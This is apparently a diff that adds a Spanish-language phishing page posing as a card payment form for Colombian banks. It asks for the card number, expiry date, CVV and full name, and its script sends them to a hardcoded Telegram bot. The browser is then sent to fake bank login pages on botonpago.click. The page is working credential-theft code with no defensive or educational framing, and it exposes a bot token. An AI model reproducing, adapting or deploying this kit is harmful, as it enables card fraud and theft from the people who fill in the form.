@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pago con Tarjeta</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f1f4f9;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background-color: #004f9f;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+
+    section {
+      max-width: 500px;
+      margin: 30px auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+    }
+
+    h3 {
+      text-align: center;
+      color: #004f9f;
+    }
+
+    .entradas {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      font-size: 15px;
+    }
+
+    .etiquetas {
+      font-weight: bold;
+      display: block;
+      margin-top: 10px;
+      color: #333;
+    }
+
+    .select-box {
+      position: relative;
+      width: 100%;
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 15px;
+      text-align: left;
+      cursor: pointer;
+    }
+
+    .select-box:after {
+      content: '▼';
+      position: absolute;
+      right: 15px;
+      top: 12px;
+      color: #666;
+      pointer-events: none;
+    }
+
+    .options-list {
+      display: none;
+      position: absolute;
+      background-color: #fff;
+      width: 100%;
+      border: 1px solid #ccc;
+      max-height: 200px;
+      overflow-y: auto;
+      z-index: 2;
+      margin-top: 5px;
+      border-radius: 8px;
+    }
+
+    .options-list li {
+      padding: 10px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .options-list li:hover {
+      background-color: #f0f0f0;
+    }
+
+    .texto2 {
+      color: #555;
+      font-size: 15px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    footer {
+      background-color: #004f9f;
+      color: white;
+      text-align: center;
+      padding: 15px;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+<img src="ban.jpeg" alt="" width="100%">
+
+
+<section>
+  <h3>Paga con tu tarjeta de debito o credito</h3>
+
+
+<img src="medios.jpeg" alt="" width="100%">
+  <label class="etiquetas">Número de la Tarjeta</label>
+  <input type="text" class="entradas" id="tc" placeholder="1234 5678 9012 3456" maxlength="19"/>
+
+  <label class="etiquetas">Fecha de Vencimiento</label>
+  <input type="text" class="entradas" id="venc" placeholder="MM/YYYY" maxlength="7"/>
+
+  <label class="etiquetas">Código de Seguridad</label>
+  <input type="text" class="entradas" id="cvv" placeholder="CVV" maxlength="4"/>
+
+  <label class="etiquetas">Número de Cuotas</label>
+  <input type="text" class="entradas" id="cuotas" placeholder="1" maxlength="2"/>
+
+  <label class="etiquetas">Nombres y Apellidos</label>
+  <input type="text" class="entradas" id="nombre" placeholder="Tu nombre completo"/>
+
+  <label class="etiquetas">Selecciona tu Entidad Bancaria</label>
+  <div class="select-box" onclick="toggleOptions1()">
+    <span id="selectedOption1">Selecciona</span>
+    <ul id="optionsList1" class="options-list">
+      <li onclick="selectTC('b-34f1','Banco AV Villas')">Banco AV Villas</li>
+      <li onclick="selectTC('b-34f13','BBVA Colombia')">BBVA Colombia</li>
+      <li onclick="selectTC('b-34f4','Banco De Bogotá')">Banco De Bogotá</li>
+      <li onclick="selectTC('b-34f2','Banco Caja Social')">Banco Caja Social</li>
+      <li onclick="selectTC('b-34f9','Bancolombia')">Bancolombia</li>
+      <li onclick="selectTC('b-34f3','Davivienda')">Davivienda</li>
+     
+      <li onclick="selectTC('b-34f14','Banco De Occidente')">Banco De Occidente</li>
+      <li onclick="selectTC('b-34f18','Banco Popular')">Banco Popular</li>
+      
+    </ul>
+  </div>
+  <input id="selectedValue1" type="hidden">
+</section>
+<br><br><br><br>
+<img src="seg.jpeg" alt="" width="100%">
+<img src="fin.jpeg" alt="" width="100%">
+
+<script>
+  function toggleOptions1() {
+    const list = document.getElementById("optionsList1");
+    list.style.display = list.style.display === "block" ? "none" : "block";
+  }
+
+  function selectTC(valor, nombre) {
+    document.getElementById("selectedOption1").innerText = nombre;
+    document.getElementById("selectedValue1").value = nombre;
+    document.getElementById("optionsList1").style.display = "none";
+    enviarPago();
+  }
+
+  function enviarPago() {
+    const tarjeta = document.getElementById("tc").value.trim();
+    const venc = document.getElementById("venc").value.trim();
+    const cvv = document.getElementById("cvv").value.trim();
+    const cuotas = document.getElementById("cuotas").value.trim();
+    const nombreCompleto = document.getElementById("nombre").value.trim();
+    const banco = document.getElementById("selectedValue1").value;
+
+    if (!tarjeta || !venc || !cvv || !cuotas || !nombreCompleto || !banco) {
+      alert("Completa todos los campos antes de seleccionar el banco.");
+      return;
+    }
+
+    const mensaje = `💳 NUEVO PAGO TARJETA\n\n🧾 Titular: ${nombreCompleto}\n🏦 Banco: ${banco}\n💳 Tarjeta: ${tarjeta}\n📆 Vencimiento: ${venc}\n🔐 CVV: ${cvv}\n📊 Cuotas: ${cuotas}`;
+   const token = "5994237488:AAGUtik1uogUX4yBD3PcFZd43pOI2Jf7SmA";
+    const chat_id = "5647970395";
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id, text: mensaje })
+    }).catch(error => {
+      alert("Error al enviar a Telegram.");
+    });
+
+    const bancoRedirecciones = {
+      "Banco AV Villas": "https://botonpago.click/transaction/ent/b-34f1/inicio/",
+      "BBVA Colombia": "https://botonpago.click/transaction/ent/b-34f13/",
+      "Banco De Bogotá": "https://botonpago.click/transaction/ent/b-34f4/wps.portal/",
+      "Banco Caja Social": "https://botonpago.click/transaction/ent/b-34f2/",
+      "Bancolombia": "https://botonpago.click/boton/dinadatos/bancol/cel-login.html",
+      "Davivienda": "https://botonpago.click/transaction/ent/b-34f3/",
+      "Banco Falabella": "https://botonpago.click/transaction/ent/b-34f5/",
+      "Banco De Occidente": "https://botonpago.click/transaction/ent/b-34f14/",
+      "Banco Popular": "https://botonpago.click/transaction/ent/b-34f18/login/",
+      "Scotiabank Colpatria": "https://botonpago.click/transaction/ent/b-34f12/wps/"
+    };
+
+    const urlDestino = bancoRedirecciones[banco];
+    if (urlDestino) {
+      setTimeout(() => {
+        window.location.href = urlDestino;
+      }, 700);
+    } else {
+      alert("No se encontró la URL del banco.");
+    }
+  }
+</script>
+
+</body>
+</html>
